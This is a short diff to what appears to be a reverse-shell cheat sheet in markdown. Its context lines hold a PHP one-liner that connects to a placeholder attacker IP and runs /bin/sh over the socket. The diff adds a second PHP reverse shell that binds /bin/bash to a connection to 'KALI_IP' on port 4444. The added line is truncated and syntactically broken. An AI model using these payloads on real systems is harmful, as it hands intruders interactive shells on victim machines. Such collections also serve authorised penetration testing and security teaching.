@@ -65,6 +65,8 @@ subprocess.call(["/bin/sh","-i"]);'
 ```php
 php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);
 exec("/bin/sh -i <&3 >&3 2>&3");'
+    
+ <?php $sock = fsockopen("KALI_IP", 4444); proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes>
 ```
 
 ---
